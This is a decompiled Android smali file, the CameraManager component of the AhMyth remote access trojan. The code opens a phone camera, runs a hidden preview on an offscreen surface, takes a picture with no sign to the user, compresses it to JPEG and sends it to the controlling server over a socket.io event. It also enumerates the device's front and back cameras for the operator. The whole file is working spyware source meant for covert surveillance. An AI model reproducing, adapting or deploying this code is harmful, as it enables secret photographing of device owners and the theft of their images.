.class public Lahmyth/mine/king/ahmyth/managers/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private final context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 24
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 25
    iput-object p1, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->context:Landroid/content/Context;

    .line 26
    return-void
.end method

.method private releaseCamera()V
    .locals 1

    .line 70
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 71
    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 72
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 73
    const/4 v0, 0x0

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    .line 75
    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 7
    .param p1, "data"    # [B

    .line 54
    :try_start_0
    array-length v0, p1

    const/4 v1, 0x0

    invoke-static {p1, v1, v0}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 55
    .local v0, "bitmap":Landroid/graphics/Bitmap;
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 56
    .local v2, "bos":Ljava/io/ByteArrayOutputStream;
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x14

    invoke-virtual {v0, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 57
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 58
    .local v3, "object":Lorg/json/JSONObject;
    const-string v4, "image"

    const/4 v5, 0x1

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 59
    const-string v4, "buffer"

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    invoke-virtual {v3, v4, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 60
    invoke-static {}, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->getInstance()Lahmyth/mine/king/ahmyth/config/InputOutputSocket;

    move-result-object v4

    invoke-virtual {v4}, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v4

    const-string v6, "x0000ca"

    new-array v5, v5, [Ljava/lang/Object;

    aput-object v3, v5, v1

    invoke-virtual {v4, v6, v5}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 65
    nop

    .end local v0    # "bitmap":Landroid/graphics/Bitmap;
    .end local v2    # "bos":Ljava/io/ByteArrayOutputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    goto :goto_0

    .line 63
    :catch_0
    move-exception v0

    .line 64
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    .line 67
    .end local v0    # "e":Lorg/json/JSONException;
    :goto_0
    return-void
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 11

    .line 79
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "android.hardware.camera.any"

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    .line 80
    return-object v1

    .line 84
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 85
    .local v0, "cameras":Lorg/json/JSONObject;
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 86
    .local v2, "list":Lorg/json/JSONArray;
    const-string v3, "camList"

    const/4 v4, 0x1

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 89
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    .line 91
    .local v3, "numberOfCameras":I
    const/4 v5, 0x0

    .local v5, "i":I
    :goto_0
    if-ge v5, v3, :cond_3

    .line 93
    new-instance v6, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v6}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 94
    .local v6, "info":Landroid/hardware/Camera$CameraInfo;
    invoke-static {v5, v6}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 96
    iget v7, v6, Landroid/hardware/Camera$CameraInfo;->facing:I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v8, "id"

    const-string v9, "name"

    if-ne v7, v4, :cond_1

    .line 98
    :try_start_1
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 99
    .local v7, "jo":Lorg/json/JSONObject;
    const-string v10, "Front"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 100
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 101
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 102
    nop

    .end local v7    # "jo":Lorg/json/JSONObject;
    goto :goto_1

    .line 103
    :cond_1
    iget v7, v6, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v7, :cond_2

    .line 105
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 106
    .restart local v7    # "jo":Lorg/json/JSONObject;
    const-string v10, "Back"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 107
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 108
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 109
    nop

    .end local v7    # "jo":Lorg/json/JSONObject;
    goto :goto_1

    .line 112
    :cond_2
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 113
    .restart local v7    # "jo":Lorg/json/JSONObject;
    const-string v10, "Other"

    invoke-virtual {v7, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 114
    invoke-virtual {v7, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 115
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 91
    .end local v6    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v7    # "jo":Lorg/json/JSONObject;
    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 119
    .end local v5    # "i":I
    :cond_3
    const-string v4, "list"

    invoke-virtual {v0, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 120
    return-object v0

    .line 123
    .end local v0    # "cameras":Lorg/json/JSONObject;
    .end local v2    # "list":Lorg/json/JSONArray;
    .end local v3    # "numberOfCameras":I
    :catch_0
    move-exception v0

    .line 124
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    .line 127
    .end local v0    # "e":Lorg/json/JSONException;
    return-object v1
.end method

.method public synthetic lambda$startUp$0$CameraManager([BLandroid/hardware/Camera;)V
    .locals 0
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .line 44
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/managers/CameraManager;->releaseCamera()V

    .line 45
    invoke-direct {p0, p1}, Lahmyth/mine/king/ahmyth/managers/CameraManager;->sendPhoto([B)V

    .line 46
    return-void
.end method

.method public startUp(I)V
    .locals 4
    .param p1, "cameraID"    # I

    .line 31
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    .line 32
    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    .line 33
    .local v0, "parameters":Landroid/hardware/Camera$Parameters;
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 36
    :try_start_0
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v2, Landroid/graphics/SurfaceTexture;

    const/4 v3, 0x0

    invoke-direct {v2, v3}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 37
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 41
    goto :goto_0

    .line 39
    :catch_0
    move-exception v1

    .line 40
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 43
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/managers/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v2, Lahmyth/mine/king/ahmyth/managers/CameraManager$$ExternalSyntheticLambda0;

    invoke-direct {v2, p0}, Lahmyth/mine/king/ahmyth/managers/CameraManager$$ExternalSyntheticLambda0;-><init>(Lahmyth/mine/king/ahmyth/managers/CameraManager;)V

    const/4 v3, 0x0

    invoke-virtual {v1, v3, v3, v2}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 47
    return-void
.end method
